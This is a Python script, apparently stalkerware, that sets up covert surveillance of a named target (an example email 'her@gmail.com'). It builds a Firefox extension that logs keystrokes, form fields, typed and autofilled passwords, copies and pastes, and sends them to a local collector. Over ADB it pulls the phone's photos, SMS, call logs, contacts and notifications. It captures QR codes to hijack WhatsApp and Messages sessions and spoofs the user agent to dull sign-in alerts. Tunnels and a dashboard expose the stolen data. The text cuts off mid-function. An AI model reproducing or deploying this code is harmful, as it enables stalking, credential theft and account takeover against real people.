#!/usr/bin/env python3
"""
GODMODE MAX v6  -  final

  kiosk (7 tabs, no url bar)  +  keystroke/form/password/copy capture
  live dashboard  +  notification mirror  +  phone control  +  qr relay

  python3 godmode.py
  DOMAIN=yourdomain.com EMAIL=her@gmail.com python3 godmode.py
  KIOSK=0 python3 godmode.py            keep the tab bar visible

Phone layer, one time on the phone:
  Settings > About > tap Build number 7x
  Developer options > Wireless debugging > ON > Pair device with pairing code
  adb pair <ip>:<pair-port>   then   adb connect <ip>:<debug-port>
"""

import base64
import json
import os
import platform
import re
import secrets
import shutil
import signal
import subprocess
import sys
import time
import urllib.error
import urllib.request
import zipfile
from pathlib import Path

# ============================================================== configuration

DOMAIN    = os.environ.get("DOMAIN", "").strip()
EMAIL     = os.environ.get("EMAIL", "").strip()
TZ_NAME   = os.environ.get("TZ", "America/Chicago")
MEM       = os.environ.get("MEM", "3g")
KIOSK     = os.environ.get("KIOSK", "1")
KEYPORT   = int(os.environ.get("KEYPORT", "8099"))
TERMPORT  = int(os.environ.get("TERMPORT", "7681"))
DASHPORT  = int(os.environ.get("DASHPORT", "8098"))
VNC_PORT  = int(os.environ.get("VNC_PORT", "80"))
PULL_SECS = int(os.environ.get("PULL_SECS", "600"))
TUNNEL    = "gm"
IMAGE     = "jlesage/firefox"

# Windows Firefox - "New sign-in on Windows" is boring. "Linux" invites a look.
UA = os.environ.get("UA",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) "
    "Gecko/20100101 Firefox/128.0")

WIDTH  = int(os.environ.get("WIDTH", "820"))
HEIGHT = int(os.environ.get("HEIGHT", "1400"))

SERVICES = [
    ("gmail",     "https://accounts.google.com/AccountChooser?Email=" + EMAIL
                  if EMAIL else "https://mail.google.com"),
    ("messages",  "https://messages.google.com/web"),
    ("whatsapp",  "https://web.whatsapp.com"),
    ("instagram", "https://www.instagram.com/direct/inbox"),
    ("photos",    "https://photos.google.com"),
    ("contacts",  "https://contacts.google.com"),
    ("security",  "https://myaccount.google.com/device-activity"),
]

PHONE_DIRS = ("/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Movies",
              "/sdcard/Download", "/sdcard/Documents",
              "/sdcard/Android/media/com.whatsapp/WhatsApp/Media")

# ==================================================================== helpers

class Fail:
    returncode = 1

def say(m): print("\n\033[1m== %s\033[0m" % m, flush=True)
def ok(m):  print("  \033[32m ok \033[0m %s" % m, flush=True)
def bad(m): print("  \033[31m !! \033[0m %s" % m, flush=True)
def have(c): return shutil.which(c) is not None

SUDO = [] if os.geteuid() == 0 else (["sudo"] if have("sudo") else [])

def sh(cmd, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    try:
        return subprocess.run(SUDO + cmd, **kw)
    except Exception:
        return Fail()

def pick_base():
    for cand in ("/root/kiosk", os.path.expanduser("~/kiosk"), "/tmp/kiosk"):
        try:
            p = Path(cand); p.mkdir(parents=True, exist_ok=True)
            t = p / ".w"; t.write_text("x"); t.unlink()
            return p
        except Exception:
            continue
    return Path.cwd() / "kiosk"

BASE    = pick_base()
EXT     = BASE / "ext"
TUNROOT = BASE / "tunnels"
PROF    = BASE / "profiles"
PIDDIR  = BASE / "pids"
DUMP    = BASE / "dump"
SECRETS = BASE / "secrets.env"
KEYS    = BASE / "keys.log"
NOTIF   = DUMP / "notifications.txt"
INFO    = DUMP / "phone_info.txt"
XPIFILE = BASE / "klog.xpi"
for d in (BASE, EXT, TUNROOT, PROF, PIDDIR, DUMP):
    d.mkdir(parents=True, exist_ok=True)

try:
    SELF = Path(__file__).resolve()
except NameError:
    SELF = BASE / "godmode.py"

def http_code(url, timeout=3, auth=None):
    try:
        req = urllib.request.Request(url)
        if auth:
            req.add_header("Authorization",
                           "Basic " + base64.b64encode(auth.encode()).decode())
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

def http_post(url, obj, timeout=3):
    try:
        req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                     method="POST",
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

def download(url, dest):
    tmp = dest.with_suffix(dest.suffix + ".new")
    try:
        with urllib.request.urlopen(url, timeout=120) as r, open(tmp, "wb") as f:
            shutil.copyfileobj(r, f)
        os.chmod(tmp, 0o755)
        os.replace(tmp, dest)
        return True
    except Exception as e:
        bad("download failed: %s (%s)" % (url, e))
        return False

def spawn(cmd, logfile=None, name=None, env=None):
    out = open(logfile, "ab") if logfile else subprocess.DEVNULL
    p = subprocess.Popen(cmd, stdout=out, stderr=subprocess.STDOUT,
                         stdin=subprocess.DEVNULL, start_new_session=True,
                         env=env)
    if name:
        (PIDDIR / (name + ".pid")).write_text(str(p.pid))
    return p

def kill_pidfile(name):
    f = PIDDIR / (name + ".pid")
    if not f.exists():
        return
    try:
        os.kill(int(f.read_text().strip()), signal.SIGTERM)
    except Exception:
        pass
    try:
        f.unlink()
    except Exception:
        pass

def write_helper(name, body):
    for target in (Path("/usr/local/bin") / name, BASE / name):
        try:
            target.write_text(body)
            os.chmod(str(target), 0o755)
            return target
        except Exception:
            continue
    return BASE / name

def human(n):
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return "%.1f %s" % (n, u)
        n /= 1024.0
    return "%.1f TB" % n

# ================================================================ banner/deps

print("\033[1m")
print("  +--------------------------------------------------+")
print("  |  GODMODE MAX v6  -  kiosk / keys / phone / dash  |")
print("  +--------------------------------------------------+")
print("\033[0m")
print("  base    : %s" % BASE)
print("  machine : %s / %s" % (platform.machine(), platform.system()))
print("  email   : %s" % (EMAIL or "(none - using mail.google.com)"))
print("  kiosk   : %s" % ("hidden url bar" if KIOSK == "1" else "tab bar visible"))

say("deps")
os.environ.setdefault("DEBIAN_FRONTEND", "noninteractive")
sh(["apt-get", "update", "-qq"])
sh(["apt-get", "install", "-y", "-qq", "curl", "ca-certificates", "openssl",
    "python3", "zip", "screen", "adb", "zbar-tools", "qrencode"])
ok("base packages")

if not have("docker"):
    try:
        r = subprocess.run("curl -fsSL https://get.docker.com | sh", shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ok("docker installed") if r.returncode == 0 else bad("docker install")
    except Exception:
        bad("docker install")
else:
    ok("docker present")
sh(["systemctl", "enable", "--now", "docker"])

arch = platform.machine().lower()
if arch in ("x86_64", "amd64"):
    A_CF, A_TTYD = "amd64", "x86_64"
elif arch in ("aarch64", "arm64"):
    A_CF, A_TTYD = "arm64", "aarch64"
elif arch.startswith("armv7") or arch.startswith("armv6"):
    A_CF, A_TTYD = "arm", "armhf"
else:
    A_CF, A_TTYD = "amd64", "x86_64"

if not have("cloudflared"):
    t = Path("/usr/local/bin/cloudflared")
    if not os.access(str(t.parent), os.W_OK):
        t = BASE / "cloudflared"
    ok("cloudflared") if download(
        "https://github.com/cloudflare/cloudflared/releases/latest/download/"
        "cloudflared-linux-" + A_CF, t) else bad("cloudflared")
else:
    ok("cloudflared present")

if not have("ttyd"):
    sh(["apt-get", "install", "-y", "-qq", "ttyd"])
    if not have("ttyd"):
        t = Path("/usr/local/bin/ttyd")
        if not os.access(str(t.parent), os.W_OK):
            t = BASE / "ttyd"
        ok("ttyd (static)") if download(
            "https://github.com/tsl0922/ttyd/releases/latest/download/ttyd." + A_TTYD,
            t) else bad("ttyd")
    else:
        ok("ttyd (apt)")
else:
    ok("ttyd present")

# ==================================================================== secrets

say("secrets")
if not SECRETS.exists():
    SECRETS.write_text(
        "PW_VNC=%s\n"     % secrets.token_hex(4) +
        "PW_TERM=%s\n"    % secrets.token_hex(6) +
        "DASH_TOKEN=%s\n" % secrets.token_hex(8))
    os.chmod(str(SECRETS), 0o600)

PW = {}
for line in SECRETS.read_text().splitlines():
    if "=" in line:
        k, v = line.split("=", 1)
        PW[k.strip()] = v.strip()
PW.setdefault("PW_VNC", secrets.token_hex(4))
PW.setdefault("PW_TERM", secrets.token_hex(6))
PW.setdefault("DASH_TOKEN", secrets.token_hex(8))
ok("secrets in %s" % SECRETS)

# ================================================================== extension

say("capture extension")

MANIFEST = {
    "manifest_version": 2,
    "name": "klog",
    "version": "6.0",
    "browser_specific_settings": {"gecko": {"id": "klog@kiosk"}},
    "permissions": ["<all_urls>"],
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["klog.js"],
        "run_at": "document_start",
        "all_frames": True,
    }],
}

KLOG_JS = r"""
(function () {
  "use strict";
  var EP = "http://host.docker.internal:8099/k";
  var buf = [], caps = false, lastPwd = new WeakMap(), lastClip = "";

  function emit(s) { if (s) buf.push(s); }
  function flush(beacon) {
    if (!buf.length) return;
    var payload = JSON.stringify({
      t: Date.now(), url: location.href, title: document.title, text: buf.join("")
    });
    buf = [];
    try {
      if (beacon && navigator.sendBeacon) { navigator.sendBeacon(EP, payload); return; }
      fetch(EP, { method: "POST", body: payload, keepalive: true, mode: "cors" })
        .catch(function () {});
    } catch (e) {}
  }

  document.addEventListener("keydown", function (e) {
    if (e.isComposing || e.keyCode === 229) return;
    var k = e.key;
    if (k == null) return;
    if (k === "Backspace") k = "[<]";
    else if (k === "Enter") k = "\n";
    else if (k === "Tab") k = "\t";
    else if (k.length > 1) {
      if (k === "Unidentified") return;
      k = "";
    }
    var m = "";
    if (e.ctrlKey && k !== "Control") m += "^";
    if (e.altKey)  m += "!";
    if (e.metaKey) m += "@";
    if (m && k) k = "[" + m + k + "]";
    var nc = false;
    try { nc = !!(e.getModifierState && e.getModifierState("CapsLock")); } catch (x) {}
    if (nc !== caps) { emit(nc ? "[CAPS:on]" : "[CAPS:off]"); caps = nc; }
    emit(k);
    if (buf.length > 200) flush(false);
  }, true);

  document.addEventListener("paste", function (e) {
    var cb = e.clipboardData || window.clipboardData;
    if (!cb) return;
    var s = cb.getData("text");
    if (s) emit("[PASTE:" + s + "]");
    flush(false);
  }, true);

  document.addEventListener("copy", function () {
    try {
      var sel = String(window.getSelection ? window.getSelection() : "");
      if (!sel || sel === lastClip) return;
      lastClip = sel;
      emit("[COPY:" + sel.slice(0, 400) + "]");
      flush(false);
    } catch (e) {}
  }, true);

  document.addEventListener("submit", function (e) {
    var f = e.target;
    if (!f || !f.elements) return;
    var parts = [];
    for (var i = 0; i < f.elements.length; i++) {
      var el = f.elements[i];
      if (!el.name || el.disabled) continue;
      var ty = (el.type || "").toLowerCase();
      if (ty === "submit" || ty === "button" || ty === "image" || ty === "hidden") continue;
      if (ty === "checkbox" || ty === "radio") {
        if (el.checked) parts.push(el.name + "=" + el.value);
        continue;
      }
      if (el.value) parts.push(el.name + "=" + el.value);
    }
    if (parts.length) {
      emit("\n[FORM " + location.host + "] " + parts.join(" & ") + "\n");
      flush(false);
    }
  }, true);

  document.addEventListener("blur", function (e) {
    var el = e.target;
    if (el && el.tagName === "INPUT" && el.type === "password" && el.value) {
      emit("\n[PWD " + location.host + "] " + el.value + "\n");
      flush(false);
    }
  }, true);

  setInterval(function () {
    var els = document.querySelectorAll("input[type=password]");
    for (var i = 0; i < els.length; i++) {
      var el = els[i], v = el.value;
      if (!v || lastPwd.get(el) === v || document.activeElement === el) continue;
      lastPwd.set(el, v);
      emit("\n[AUTOFILL " + location.host + "] " + v + "\n");
      flush(false);
    }
  }, 3000);

  setInterval(function () { flush(false); }, 5000);
  addEventListener("pagehide", function () { flush(true); });
  addEventListener("beforeunload", function () { flush(true); });
  addEventListener("visibilitychange", function () { if (document.hidden) flush(true); });
})();
"""

(EXT / "manifest.json").write_text(json.dumps(MANIFEST, indent=1))
(EXT / "klog.js").write_text(KLOG_JS)
if XPIFILE.exists():
    XPIFILE.unlink()
with zipfile.ZipFile(str(XPIFILE), "w", zipfile.ZIP_DEFLATED) as z:
    z.write(str(EXT / "manifest.json"), "manifest.json")
    z.write(str(EXT / "klog.js"), "klog.js")
ok("klog.xpi built (%d bytes)" % XPIFILE.stat().st_size)

# ================================================================== collector

say("collector")

COLLECTOR = r'''#!/usr/bin/env python3
import json, os, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LOG  = os.environ.get("KEYLOG", "/root/kiosk/keys.log")
PORT = int(os.environ.get("KEYPORT", "8099"))
MAXB = 8 * 1024 * 1024

def rotate():
    try:
        if os.path.getsize(LOG) > MAXB:
            os.replace(LOG, LOG + ".1")
    except OSError:
        pass

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def _send(self, code, body=b"", ctype="text/plain; charset=utf-8"):
        self.send_response(code)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body: self.wfile.write(body)
    def do_OPTIONS(self): self._send(204)
    def do_GET(self):
        if self.path.startswith("/health"): return self._send(200, b"ok\n")
        try:
            with open(LOG, "rb") as f:
                f.seek(0, 2); n = f.tell(); f.seek(max(0, n - 65536)); data = f.read()
        except OSError: data = b""
        self._send(200, data)
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        try: d = json.loads(raw)
        except Exception: d = {"text": raw}
        d["t"] = int(time.time())
        rotate()
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps(d, ensure_ascii=False) + "\n")
        self._send(204)

ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
'''

CPATH = BASE / "keylog.py"
CPATH.write_text(COLLECTOR)
os.chmod(str(CPATH), 0o755)
kill_pidfile("keylog")
cenv = dict(os.environ, KEYPORT=str(KEYPORT), KEYLOG=str(KEYS))
spawn([sys.executable, str(CPATH)], logfile=BASE / "keylog.out",
      name="keylog", env=cenv)
time.sleep(0.8)
ok("collector on :%d" % KEYPORT) if http_code("http://127.0.0.1:%d/health" % KEYPORT) == 200 \
    else bad("collector did not start")

# ===================================================================== kiosk

say("kiosk")
pdir = PROF / "ff-kiosk"
(pdir / "profile" / "extensions").mkdir(parents=True, exist_ok=True)
shutil.copy(str(XPIFILE), str(pdir / "profile" / "extensions" / "klog@kiosk.xpi"))
sh(["chown", "-R", "1000:1000", str(pdir)])
sh(["docker", "rm", "-f", "ff-kiosk"])

cmd = [
    "docker", "run", "-d", "--name", "ff-kiosk",
    "--restart", "unless-stopped",
    "--add-host", "host.docker.internal:host-gateway",
    "-p", "127.0.0.1:%d:5800" % VNC_PORT,
    "-v", str(pdir) + ":/config",
    "-e", "USER_ID=1000", "-e", "GROUP_ID=1000",
    "-e", "VNC_PASSWORD=" + PW["PW_VNC"],
    "-e", "WEB_AUDIO=1",
    "-e", "FF_KIOSK=%s" % KIOSK,
    "-e", "DISPLAY_WIDTH=%d" % WIDTH,
    "-e", "DISPLAY_HEIGHT=%d" % HEIGHT,
    "-e", "TZ=" + TZ_NAME,
    "-e", "KEEP_APP_RUNNING=1",
    "-e", "FF_PREF_general_useragent_override=" + UA,
    "-e", "FF_PREF_browser_startup_homepage=" + "|".join(u for _, u in SERVICES),
    "-e", "FF_PREF_browser_startup_page=1",
    "-e", "FF_PREF_browser_fullscreen_autohide=true",
    "-e", "FF_PREF_xpinstall_signatures_required=false",
    "-e", "FF_PREF_security_mixed_content_block_active_content=false",
    "-e", "FF_PREF_extensions_autoDisableScopes=0",
    "--shm-size", "2g", "--memory", MEM,
    IMAGE,
]
if sh(cmd).returncode == 0:
    ok("ff-kiosk :%d  %dx%d  %d tabs" % (VNC_PORT, WIDTH, HEIGHT, len(SERVICES)))
else:
    bad("ff-kiosk failed")

# =================================================================== terminal

say("terminal")
kill_pidfile("ttyd")
ttyd_bin = shutil.which("ttyd") or str(BASE / "ttyd")
spawn([ttyd_bin, "-p", str(TERMPORT), "-i", "127.0.0.1",
       "-c", "%s:%s" % (os.environ.get("USER", "root"), PW["PW_TERM"]), "-W", "bash"],
      logfile=BASE / "ttyd.out", name="ttyd")
time.sleep(0.8)
ok("ttyd :%d" % TERMPORT) if http_code("http://127.0.0.1:%d/" % TERMPORT) else bad("ttyd")

# ================================================================ phone layer

say("phone layer")

def adb(*args, timeout=180):
    try:
        return subprocess.run(["adb"] + list(args), capture_output=True,
                              text=True, timeout=timeout)
    except Exception:
        return Fail()

def phone_connected():
    if not have("adb"):
        return False
    out = getattr(adb("devices", timeout=15), "stdout", "") or ""
    for line in out.splitlines()[1:]:
        p = line.split()
        if len(p) >= 2 and p[1] == "device":
            return True
    return False

PULLER = r'''#!/usr/bin/env python3
import subprocess, sys, time, pathlib
dump = pathlib.Path(sys.argv[1]); interval = int(sys.argv[2])
dirs = sys.argv[3].split("|")
once = len(sys.argv) > 4
def run(*a):
    try: return subprocess.run(["adb"] + list(a), capture_output=True, text=True, timeout=900)
    except Exception: return None
while True:
    try:
        for remote in dirs:
            name = remote.rstrip("/").rsplit("/", 1)[-1]
            if name == "Media": name = "whatsapp_media"
            run("pull", "-a", remote, str(dump / name))
        for label, uri in (("sms", "content://sms"),
                           ("call_log", "content://call_log/calls"),
                           ("contacts", "content://contacts/phones")):
            r = run("shell", "content", "query", "--uri", uri)
            if r: (dump / (label + ".txt")).write_text(r.stdout or "")
    except Exception:
        pass
    if once: break
    time.sleep(interval)
'''

NOTIFIER = r'''#!/usr/bin/env python3
import subprocess, sys, time
out = sys.argv[1]; seen = set()
def clean(s):
    v = s.split("=", 1)[1].strip()
    if v.startswith("String ("): v = v[8:]
    if v.endswith(")"): v = v[:-1]
    return v.strip()
while True:
    try:
        r = subprocess.run(["adb", "shell", "dumpsys", "notification", "--noredact"],
                           capture_output=True, text=True, timeout=45)
        title = text = ""; batch = []
        for line in (r.stdout or "").splitlines():
            s = line.strip()
            if s.startswith("android.title="):
                title = clean(s)
            elif s.startswith("android.text="):
                text = clean(s)
                if title or text:
                    batch.append((title, text)); title = text = ""
        for t, x in batch:
            k = (t, x)
            if k in seen or (not t and not x): continue
            seen.add(k)
            with open(out, "a", encoding="utf-8") as f:
                f.write("%s  %s | %s\n" % (time.strftime("%H:%M:%S"), t, x))
        if len(seen) > 3000: seen = set(list(seen)[-1500:])
    except Exception:
        pass
    time.sleep(15)
'''

INFOSNAP = r'''#!/usr/bin/env python3
import subprocess, sys, time
out = sys.argv[1]
probes = [("model", "getprop ro.product.model"),
          ("android", "getprop ro.build.version.release"),
          ("carrier", "getprop gsm.operator.alpha"),
          ("screen", "wm size"),
          ("storage", "df -h /sdcard"),
          ("battery", "dumpsys battery"),
          ("foreground", "dumpsys activity activities")]
while True:
    lines = []
    for label, cmd in probes:
        try:
            r = subprocess.run(["adb", "shell", cmd], capture_output=True,
                               text=True, timeout=30)
            raw = (r.stdout or "").strip()
        except Exception:
            raw = ""
        if label == "battery":
            v = [l.strip() for l in raw.splitlines() if "level:" in l]
            raw = v[0] if v else ""
        if label == "foreground":
            v = [l.strip() for l in raw.splitlines() if "mResumedActivity" in l]
            raw = v[0] if v else ""
        if label == "storage":
            raw = raw.splitlines()[-1] if raw else ""
        if raw: lines.append("%-11s %s" % (label, raw[:200]))
    lines.append("%-11s %s" % ("updated", time.strftime("%Y-%m-%d %H:%M:%S")))
    try:
        with open(out, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except Exception:
        pass
    time.sleep(30)
'''

SCREEN_QR = r'''#!/usr/bin/env python3
import pathlib, shutil, subprocess, sys, time
prof = pathlib.Path(sys.argv[1]); dump = pathlib.Path(sys.argv[2])
raw = prof / "shot.png"; tmp = dump / ".raw.png"
DN = subprocess.DEVNULL
subprocess.run(["docker", "exec", "ff-kiosk", "bash", "-c",
                "command -v import >/dev/null || (apt-get update -qq && "
                "apt-get install -y -qq imagemagick)"], stdout=DN, stderr=DN)
last = None
while True:
    try:
        subprocess.run(["docker", "exec", "ff-kiosk", "bash", "-c",
                        "D=${DISPLAY:-:0}; DISPLAY=$D import -window root /config/shot.png"],
                       stdout=DN, stderr=DN, timeout=60)
        if raw.exists():
            shutil.copy(raw, dump / "kiosk.png")
            shutil.copy(raw, tmp)
            r = subprocess.run(["zbarimg", "--raw", "-q", str(tmp)],
                               capture_output=True, text=True, timeout=20)
            found = [l.strip() for l in (r.stdout or "").splitlines() if l.strip()]
            if found:
                p = found[0]
                if p != last:
                    last = p
                    scale = "20" if len(p) <= 300 else "12"
                    subprocess.run(["qrencode", "-o", str(dump / "qr.png"),
                                    "-s", scale, "-m", "4", "-l", "M", p], timeout=20)
                    kind = "whatsapp" if p.startswith("2@") else "messages/other"
                    (dump / "qr.txt").write_text(
                        "captured %s\nkind     %s\nlength   %d\n\n%s\n"
                        % (time.strftime("%H:%M:%S"), kind, len(p), p))
                    print("qr: %s (%d chars)" % (kind, len(p)), flush=True)
            elif last is not None:
                (dump / "qr.txt").write_text("no qr on screen - switch tab\n")
                last = None
    except Exception:
        pass
    time.sleep(4)
'''

for fname, body in (("puller.py", PULLER), ("notifier.py", NOTIFIER),
                    ("infosnap.py", INFOSNAP), ("screen_qr.py", SCREEN_QR)):
    p = BASE / fname
    p.write_text(body)
    os.chmod(str(p), 0o755)

if phone_connected():
    ok("phone connected")
    for n in ("puller", "notifier", "infosnap"):
        kill_pidfile(n)
    spawn([sys.executable, str(BASE / "puller.py"), str(DUMP), str(PULL_SECS),
           "|".join(PHONE_DIRS)], name="puller")
    spawn([sys.executable, str(BASE / "notifier.py"), str(NOTIF)], name="notifier")
    spawn([sys.executable, str(BASE / "infosnap.py"), str(INFO)], name="infosnap")
    ok("puller / notifier / info running")
else:
    bad("no phone connected yet (see bottom)")
    for n in ("puller", "notifier", "infosnap"):
        kill_pidfile(n)

kill_pidfile("kioskshot")
spawn([sys.executable, str(BASE / "screen_qr.py"),
       str(pdir / "shot.png"), str(DUMP)], name="kioskshot")
ok("screen + qr relay")

# ==================================================================== tunnels

say("tunnels")
SUPERVISOR = r'''#!/usr/bin/env python3
import subprocess, sys, time
name, port, log = sys.argv[1], sys.argv[2], sys.argv[3]
while True:
    with open(log, "wb") as f:
        p = subprocess.Popen(["cloudflared", "tunnel", "--url",
                              "http://localhost:" + port, "--no-autoupdate"],
                             stdout=f, stderr=subprocess.STDOUT)
        p.wait()
    time.sleep(3)
'''
SPATH = BASE / "tunnel_sup.py"
SPATH.write_text(SUPERVISOR)
os.chmod(str(SPATH), 0o755)

URLS = {}
TARGETS = [("kiosk", VNC_PORT), ("term", TERMPORT), ("dash", DASHPORT)]

def wait_url(name, timeout=60):
    log = TUNROOT / (name + ".log")
    pat = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            m = pat.search(log.read_text(errors="ignore"))
            if m:
                return m.group(0)
        except Exception:
            pass
        time.sleep(1.5)
    return ""

if DOMAIN:
    if not have("cloudflared"):
        bad("no cloudflared"); sys.exit(1)
    if not (Path(os.path.expanduser("~")) / ".cloudflared" / "cert.pem").exists():
        bad("run: cloudflared tunnel login"); sys.exit(1)
    sh(["cloudflared", "tunnel", "create", TUNNEL])
    uuid = ""
    try:
        raw = subprocess.run(["cloudflared", "tunnel", "list", "--output", "json"],
                             capture_output=True, text=True, timeout=30).stdout
        for t in json.loads(raw):
            if t.get("name") == TUNNEL:
                uuid = t["id"]; break
    except Exception:
        pass
    if not uuid:
        bad("could not resolve tunnel id"); sys.exit(1)
    cfdir = Path("/etc/cloudflared")
    if not os.access(str(cfdir.parent), os.W_OK):
        cfdir = BASE / "cloudflared"
    cfdir.mkdir(parents=True, exist_ok=True)
    creds = Path(os.path.expanduser("~")) / ".cloudflared" / (uuid + ".json")
    (cfdir / "config.yml").write_text(
        "tunnel: %s\ncredentials-file: %s\ningress:\n" % (TUNNEL, creds) +
        "  - hostname: kiosk.%s\n    service: http://localhost:%d\n" % (DOMAIN, VNC_PORT) +
        "  - hostname: term.%s\n    service: http://localhost:%d\n" % (DOMAIN, TERMPORT) +
        "  - hostname: dash.%s\n    service: http://localhost:%d\n" % (DOMAIN, DASHPORT) +
        "  - service: http_status:404\n")
    for h in ("kiosk", "term", "dash"):
        sh(["cloudflared", "tunnel", "route", "dns", TUNNEL, h + "." + DOMAIN])
    sh(["cloudflared", "service", "install"])
    sh(["systemctl", "enable", "--now", "cloudflared"])
    for n in ("kiosk", "term", "dash"):
        URLS[n] = "https://%s.%s" % (n, DOMAIN)
    ok("named tunnel + dns")
else:
    for t_name, t_port in TARGETS:
        kill_pidfile("tun-" + t_name)
        spawn([sys.executable, str(SPATH), t_name, str(t_port),
               str(TUNROOT / (t_name + ".log"))], name="tun-" + t_name)
    for t_name, _ in TARGETS:
        URLS[t_name] = wait_url(t_name)
    ok("quick tunnels")

# ================================================================== dashboard

say("dashboard")

DASH = r'''#!/usr/bin/env python3
import base64, json, mimetypes, os, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT  = Path(os.environ["DUMP"])
KEYS  = Path(os.environ["KEYS"])
NOTIF = Path(os.environ["NOTIF"])
INFO  = Path(os.environ["INFO"])
USER  = os.environ.get("DASH_USER", "god")
TOKEN = os.environ["DASH_TOKEN"]
PORT  = int(os.environ["DASHPORT"])
KIOSK = os.environ.get("KIOSK_URL", "")
TERM  = os.environ.get("TERM_URL", "")

PAGE = """<!doctype html>
<html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>godmode</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#0b0d10;color:#d7dae0;
 font:12.5px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
header{display:flex;gap:10px;align-items:center;flex-wrap:wrap;
 padding:9px 13px;border-bottom:1px solid #1c2128}
h1{font-size:13px;margin:0;color:#7ee787;letter-spacing:.05em}
a{color:#d7dae0;text-decoration:none;border:1px solid #1c2128;
 padding:3px 9px;border-radius:6px;font-size:12px}
a:hover{border-color:#7ee787;color:#7ee787}
#st{margin-left:auto;color:#7d8590;font-size:11px}
.wrap{display:grid;grid-template-columns:1.15fr .85fr;height:calc(100vh - 45px)}
.col{border-right:1px solid #1c2128;display:flex;flex-direction:column;min-height:0}
.col:last-child{border-right:0}
h2{font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:#7d8590;
 margin:0;padding:7px 12px;border-bottom:1px solid #1c2128;background:#0e1116}
.body{overflow:auto;padding:7px 12px;flex:1;min-height:0;
 white-space:pre-wrap;word-break:break-word}
.half{max-height:24vh}
.tag{color:#ffa657}
img{width:100%;display:block;background:#000;border-bottom:1px solid #1c2128}
#qr{width:auto;max-width:100%;margin:8px auto;background:#fff;padding:6px}
@media(max-width:820px){.wrap{grid-template-columns:1fr;height:auto}
 .col{height:46vh}.half{max-height:20vh}}
</style></head><body>
<header>
 <h1>godmode</h1>
 <a href="KIOSK" target=_blank>kiosk</a>
 <a href="TERM" target=_blank>shell</a>
 <a href="/f/" target=_blank>files</a>
 <a href="/qr.png" target=_blank>qr</a>
 <span id=st></span>
</header>
<div class=wrap>
 <div class=col>
  <h2>keys / forms / passwords / copies</h2>
  <div class=body id=log></div>
 </div>
 <div class=col>
  <h2>qr (for dming)</h2>
  <img id=qr src="/qr.png">
  <h2>phone</h2>
  <img id=scr src="/screen.png">
  <h2>notifications</h2>
  <div class="body half" id=notif></div>
  <h2>device</h2>
  <div class="body half" id=info></div>
 </div>
</div>
<script>
var off=0;
function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;");}
function paint(s){
 return esc(s).replace(/\[(PWD|FORM|AUTOFILL|PASTE|COPY)[^\]]*\]/g,
   function(m){return '<span class=tag>'+m+'</span>';});
}
async function poll(){
 try{
  var r=await fetch("/api/log?since="+off,{cache:"no-store"});
  var j=await r.json();
  var el=document.getElementById("log");
  if(j.reset){el.innerHTML="";}
  if(j.lines&&j.lines.length){
   var stick=el.scrollTop+el.clientHeight>=el.scrollHeight-40;
   el.insertAdjacentHTML("beforeend",j.lines.map(paint).join("\n")+"\n");
   while(el.childNodes.length>1200)el.removeChild(el.firstChild);
   if(stick)el.scrollTop=el.scrollHeight;
  }
  off=j.size;
 }catch(e){}
 setTimeout(poll,2000);
}
async function side(){
 try{
  var n=await(await fetch("/api/notif",{cache:"no-store"})).text();
  var el=document.getElementById("notif");
  var stick=el.scrollTop+el.clientHeight>=el.scrollHeight-30;
  el.textContent=n;
  if(stick)el.scrollTop=el.scrollHeight;
  document.getElementById("info").textContent=
    await(await fetch("/api/info",{cache:"no-store"})).text();
 }catch(e){}
 setTimeout(side,6000);
}
async function stat(){
 try{
  var j=await(await fetch("/api/stat",{cache:"no-store"})).json();
  document.getElementById("st").textContent=
    j.keys+" keys · "+j.files+" files · "+j.size;
 }catch(e){}
 setTimeout(stat,8000);
}
function tick(){
 var t=Date.now();
 document.getElementById("scr").src="/screen.png?t="+t;
 document.getElementById("qr").src="/qr.png?t="+t;
 setTimeout(tick,4000);
}
poll();side();stat();tick();
</script></body></html>"""

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass

    def _auth(self):
        h = self.headers.get("Authorization", "")
        if not h.startswith("Basic "):
            return False
        try:
            u, p = base64.b64decode(h[6:]).decode().split(":", 1)
        except Exception:
            return False
        return u == USER and p == TOKEN

    def _401(self):
        b = b"auth required\n"
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="godmode"')
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _send(self, code, body, ctype="text/plain; charset=utf-8"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
